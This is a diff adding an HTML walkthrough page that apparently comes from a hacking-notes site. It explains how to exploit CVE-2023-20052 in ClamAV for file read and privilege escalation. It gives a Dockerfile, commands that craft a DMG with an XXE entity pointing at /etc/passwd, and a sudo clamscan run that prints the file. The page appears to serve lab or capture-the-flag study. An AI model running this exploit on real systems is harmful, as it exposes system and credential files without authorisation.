@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>ClamAV</h1>
+            <p>ClamAV is a free, open-source, and cross-platform antivirus engine designed to detect trojans, viruses, malware, and other threats. Commonly used on Linux servers and email gateways, it scans files, attachments, and mail formats to protect against malicious content</p>
+            </ul>
+            
+            
+            <h2>Privilege escalation - CVE-2023-20052</h2>
+            <ul>
+                <p>The following exploit allows to read any file in the machine due a mailinterpretation of files to scan. Of course you need to execute ClamAV with sudo privileges to read any file. The steps are the following</p>
+                <p>Create the following DockerFile</p>
+                <pre><code class="language-bash">FROM ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Dependencias base
+RUN apt-get update && apt-get install -y \
+    ca-certificates \
+    gnupg \
+    wget \
+    git \
+    gcc \
+    g++ \
+    cmake \
+    zlib1g-dev \
+    genisoimage \
+    bbe \
+    make \
+    && rm -rf /var/lib/apt/lists/*
+
+# Clonar y compilar libdmg-hfsplus
+RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git /libdmg-hfsplus
+
+WORKDIR /libdmg-hfsplus
+
+RUN cmake . && make
+
+RUN cp dmg/dmg /bin/dmg
+
+# Directorio de trabajo del exploit
+WORKDIR /exploit
+
+CMD ["/bin/bash"]
+</code></pre>
+            <p>Build it and get a shell inside the container</p>
+            <pre><code class="language-bash">sudo docker build -t cve-2023-20052 .  #Create the container
+sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash    #Get a shell insidethe container</code></pre>
+            <p>Use the following command. Get it from the <a class="notion-link" href="https://github.com/nokn0wthing/CVE-2023-20052">repo</a> just in case there som sort of error with tags </p>
+            <pre><code class="language-bash">genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
+bbe -e 's|&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;|&lt;!DOCTYPE plist [&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt; ]&gt;|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg</code></pre>    
+            <p>Obviously from this last command modify the file you would like to get. <b>This will output a file called <b>exploit.dmg</b></b> </p>    
+            <p>Finally run the <b>clamav</b> to scan the malicious file with the following command and wait for the output where your file will be printed </p>
+            <pre><code class="language-bash">sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg</code></pre>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
